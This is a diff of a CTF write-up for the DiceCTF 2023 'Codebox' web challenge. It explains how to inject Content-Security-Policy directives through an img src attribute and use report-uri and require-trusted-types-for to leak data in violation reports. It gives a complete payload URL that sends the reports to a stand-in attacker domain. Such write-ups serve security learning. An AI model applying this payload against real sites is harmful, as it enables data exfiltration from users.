@@ -1,4 +1,22 @@
-# Codebox
+---
+Title: Codebox - DiceCTF 2023
+Date: 2023-02-08T00:00:00+05:30
+Tags: [web, ctf, writeup, csp, dicectf23-writeups, report-uri, require-trusted-types-for]
+Categories: [dicectf23-writeups,All Writeups]
+Authors: [Rohit]
+---
+
+#### tl;dr
+
+  - Use img src to inject csp
+  - Use `report-uri your-domain` to get csp violation reports
+  - Use `require-trusted-types-for 'script'` to get violation when `innerHTML` is set
+  - Use `code=&code<payload>` to make code undefined in front end
+
+Final Payload: `https://codebox.mc.ax/?code=&code=<img+src="*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/"+>`
+
+
+<!--more-->
 
 ## Description
 
@@ -24,7 +42,7 @@ const CSP = [
 ```
 
 We can send HTML as a GET parameter `code` in the url.
-In the [backend](/dicectf23-writeups/codebox/files/web.js) they will process the html and find the image tags
+In the [backend](files/web.js) they will process the html and find the image tags
 
 ``` js
 const fastify = require('fastify')();
@@ -62,9 +80,9 @@ So there are no checks done in img src so we can add a `;` and add as much as cs
 
 This will add `script-src 'unsafe-inline'` to csp. So we can add any csp attribute we want.
 
-![csp-injection](/dicectf23-writeups/codebox/images/csp-injection.png)
+![csp-injection](images/csp-injection.png)
 
-But actually, the HTML is added to the webpage using [frontend](/dicectf23-writeups/codebox/files/box.html)
+But actually, the HTML is added to the webpage using [frontend](files/box.html)
 
 ```js
 const code = new URL(window.location.href).searchParams.get('code');
@@ -118,7 +136,7 @@ That's where the other attribute comes in. `require-trusted-types-for` directive
 
 But when we set that csp `require-trusted-types-for 'script'`, this is  the error we get
 
-![](/dicectf23-writeups/codebox/images/error.png)
+![error](images/error.png)
 
 We will get a report like
 
